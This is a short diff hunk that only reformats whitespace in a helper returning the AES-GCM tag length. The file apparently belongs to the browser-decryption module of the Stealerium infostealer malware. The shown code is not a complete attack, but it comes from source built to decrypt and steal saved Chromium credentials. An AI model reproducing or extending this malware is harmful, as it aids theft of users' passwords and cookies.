@@ -54,7 +54,7 @@ namespace Stealerium.Target.Browsers.Chromium
             var tagLengthsValue = GetProperty(hAlg, CbCrypt.BCRYPT_AUTH_TAG_LENGTH);
 
             return BitConverter.ToInt32(
-                new[] {tagLengthsValue[4], tagLengthsValue[5], tagLengthsValue[6], tagLengthsValue[7]}, 0);
+                new[] { tagLengthsValue[4], tagLengthsValue[5], tagLengthsValue[6], tagLengthsValue[7] }, 0);
         }
 
         private static IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
